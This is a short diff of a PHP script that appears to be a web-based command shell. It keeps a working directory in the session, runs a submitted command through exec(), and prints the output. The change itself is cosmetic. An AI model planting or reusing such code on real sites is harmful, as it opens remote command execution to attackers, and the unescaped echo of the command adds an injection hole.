@@ -44,8 +44,9 @@ if(array_key_exists('cwd',$_SESSION)) {
       }
       $_SESSION['cwd']=getcwd();
     }else if(strlen(trim($command)) > 0) {
-      echo '<p>Command: '.$command.'<hr>';
-      echo '<p>Output:<br>';
+      echo '<hr><h2>Command</h2>'.$command.'<hr>';
+      echo '<h2>Output</h2>';
+      unset($output);
       $lastline=exec($command,$output);
       foreach($output as $line) {
         echo $line.'<br>';
